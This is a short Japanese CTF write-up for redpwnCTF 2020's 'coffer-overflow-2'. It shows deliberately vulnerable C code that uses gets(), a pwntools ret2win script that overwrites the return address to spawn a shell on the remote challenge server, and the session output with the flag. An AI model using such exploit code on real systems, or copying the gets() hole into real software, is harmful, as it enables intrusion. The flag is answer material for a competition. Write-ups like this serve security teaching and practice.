# coffer-overflow-2 (530 solves / 304 points)

> You'll have to jump to a function now!?

coffer-overflow-2.c, coffer-overflow-2というファイルが添付されていた。

## solution

coffer-overflow-2.cは以下の通り

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
}

void binFunction() {
  system("/bin/sh");
}
```

BOFの脆弱性があり、`binFunction`で`system("/bin/sh")`を実行しているので、リターンアドレスを`binFunction`にするだけで良い

```python
# solve.py
from pwn import *

elf = ELF('./coffer-overflow-2')

bin_func_addr = elf.symbols['binFunction']
offset = 24

payload = b'A' * offset
payload += p64(bin_func_addr)

#p = process('./coffer-overflow-2')
p = remote('2020.redpwnc.tf', 31908)

p.sendline(payload)
p.interactive()```

```
```
$ python solve.py
...
[+] Opening connection to 2020.redpwnc.tf on port 31908: Done
[*] Switching to interactive mode
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
$ ls
Makefile
bin
coffer-overflow-2
coffer-overflow-2.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```
